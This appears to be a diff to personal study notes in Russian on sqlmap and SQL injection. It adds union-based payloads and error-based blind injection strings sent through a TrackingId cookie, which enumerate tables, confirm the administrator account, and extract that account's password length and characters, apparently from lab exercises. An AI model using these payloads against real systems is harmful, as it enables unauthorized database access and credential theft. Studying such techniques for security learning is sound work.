@@ -1,3 +1,5 @@
+# sqlmap
+
 Смотри. Этот алгоритм важно запомнить:
 
     Сначала сканишь базы флагом --dbs
@@ -166,3 +168,22 @@ sqlite3 db.sqlite
 select * from User
 
 .dump
+
+# SQL I
+    # Union based   
+        search=example' ORDER BY 1 --
+        search=example' UNION SELECT 'any_string',NULL,NULL,NULL --
+   
+    # Boolean-Based Blind SQLi
+        - определеие таблиц
+        TrackingId=xyUauUD0CUhPTyX70vz'||(SELECT '' FROM user WHERE ROWNUM = 1)||'
+        
+        - определение пользователя
+        TrackingId=UauUD0CUhPTyX70v'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+        
+        - определеие длинны пароля
+        '||(SELECT CASE WHEN LENGTH(password)=1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+        -перебор символов пароля
+        '||(SELECT CASE WHEN SUBSTR(password,N,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+       
